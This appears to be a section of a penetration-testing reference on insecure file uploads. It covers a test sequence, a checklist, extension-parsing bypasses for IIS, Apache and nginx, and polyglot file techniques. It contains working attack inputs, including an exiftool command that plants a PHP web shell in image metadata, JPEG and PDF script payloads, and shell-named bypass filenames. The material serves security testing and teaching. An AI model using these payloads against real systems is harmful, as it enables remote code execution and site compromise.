# upload-insecure-files technical reference

For other original section numbers, use the [entry index](../SKILL.md#references).

## 8. TEST SEQUENCE

1. Upload one benign marker file and map rename, path, and retrieval behavior.
2. Try one validation-bypass sample and one active-content sample.
3. Check whether retrieval is attachment, inline render, transformed preview, or background processing.
4. If processing exists, pivot by processor family: XSS, XXE, CMDi, zip slip, or SSRF.
5. Run tenant-boundary and overwrite tests on file IDs, replace endpoints, and public URLs.

---

## 9. CHAINING MAP

| Observation | Pivot |
|---|---|
| SVG or XML accepted | [xxe xml external entity](../../xxe-xml-external-entity/SKILL.md) |
| filename or metadata reflected | [xss cross site scripting](../../xss-cross-site-scripting/SKILL.md) |
| converter or processor shells out | [cmdi command injection](../../cmdi-command-injection/SKILL.md) |
| extraction path looks controllable | [path traversal lfi](../../path-traversal-lfi/SKILL.md) |
| overwrite, quota, approval, or tenant bug | [business logic vulnerabilities](../../business-logic-vulnerabilities/SKILL.md) |

---

## 10. OPERATOR CHECKLIST

```text
[] Confirm accept/store/process/serve stages separately
[] Test one extension bypass and one content-based payload
[] Check inline render vs forced download
[] Inspect filenames, metadata, and preview surfaces for reflection
[] Probe processing chain: image, archive, XML, document, PDF
[] Run A/B authorization on read, replace, delete, and share actions
[] Map predictable paths and public/private URL boundaries
```

---

## 11. UPLOAD SUCCESS RATE MODEL & ADVANCED METHODOLOGY

### Success Rate Formula

```
P(RCE via Upload) = P(bypass_detection) × P(obtain_path) × P(execute_via_webserver)
```

Many testers focus only on bypassing file type checks, but forget:

- **Path discovery**: Without knowing the upload path, even a successful bypass is useless
- **Server parsing**: Even with a `.php` file uploaded, if the web server doesn't parse it as PHP, no RCE

### Rich Text Editor Path Matrix

| Editor | Common Upload Path | Version Indicator |
|---|---|---|
| FCKeditor | `/fckeditor/editor/filemanager/connectors/` | `/fckeditor/_whatsnew.html` |
| CKEditor | `/ckeditor/` | `/ckeditor/CHANGES.md` |
| eWebEditor | `/ewebeditor/` | Admin: `/ewebeditor/admin_login.asp` |
| KindEditor | `/kindeditor/attached/` | `/kindeditor/kindeditor.js` |
| UEditor | `/ueditor/net/` or `/ueditor/php/` | `/ueditor/ueditor.config.js` |

### Validation Defect Taxonomy (5 Dimensions)

| Dimension | Flaw Examples |
|---|---|
| **Location** | Client-side only, inconsistent front/back |
| **Method** | Extension blacklist (incomplete), MIME check only, magic bytes only |
| **Logic order** | Renames AFTER execution check, validates BEFORE full upload |
| **Scope** | Checks filename but not file content, checks first bytes only |
| **Execution context** | Upload succeeds but different vhost/handler processes the file |

### Response Manipulation Bypass

```
# If server returns allowedTypes in response for client-side validation:
# Intercept response → modify allowedTypes to include .php → upload .php
# The server never actually validates — it trusts client filtering
```

### IIS Semicolon Parsing

```
# IIS treats semicolon as parameter delimiter in filenames:
shell.asp;.jpg    → IIS executes as ASP
# NTFS Alternate Data Stream:
shell.asp::$DATA  → Bypasses extension check, IIS may execute
```

### Apache Multi-Extension

```
# Apache parses right-to-left for handler:
shell.php.jpg     → May execute as PHP if AddHandler php applies
# Newline in filename (CVE-2017-15715):
shell.php\x0a     → Bypasses regex but Apache still executes as PHP
```

### Nginx cgi.fix_pathinfo

```
# With cgi.fix_pathinfo=1 (PHP-FPM):
/uploads/image.jpg/anything.php → PHP processes image.jpg as PHP!
# Upload legitimate-looking JPG with PHP code embedded
```

---

## 12. POLYGLOT FILE TECHNIQUES

Files that are simultaneously valid in two or more formats, bypassing format-specific validation while delivering a dangerous payload.

### GIFAR (GIF + JAR)

```text
# GIF header + JAR appended
# GIF89a header (6 bytes) + padding + JAR archive (ZIP format)
# Browser: valid GIF image
# Java: valid JAR archive → applet execution (legacy)

cat header.gif payload.jar > gifar.gif
# Passes image validation, executes as Java applet if loaded via <applet>
```

### PNG + PHP polyglot

```bash
# Inject PHP code into PNG IDAT chunk or tEXt metadata
# The PNG renders as valid image; when included via LFI, PHP code executes

# Method 1: PHP in tEXt chunk
python3 -c "
import struct
png_header = b'\x89PNG\r\n\x1a\n'
# ... minimal IHDR + IDAT + tEXt chunk containing PHP
"

# Method 2: Use exiftool to inject into comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.png
# Upload image.png → LFI include → PHP executes from metadata
```

### JPEG + JS polyglot

```bash
# JPEG comment marker (0xFFFE) can contain JavaScript
# If served with Content-Type: text/html (or MIME sniffing active):
exiftool -Comment='<script>alert(document.domain)</script>' photo.jpg

# Combined with content-type confusion → XSS via image upload
```

### PDF + JS polyglot

```text
# PDF header followed by JS:
%PDF-1.0
1 0 obj<</Pages 2 0 R>>endobj
2 0 obj<</Kids[3 0 R]/Count 1>>endobj
3 0 obj<</MediaBox[0 0 3 3]>>endobj
trailer<</Root 1 0 R>>
*/=alert('XSS')/*
```

---

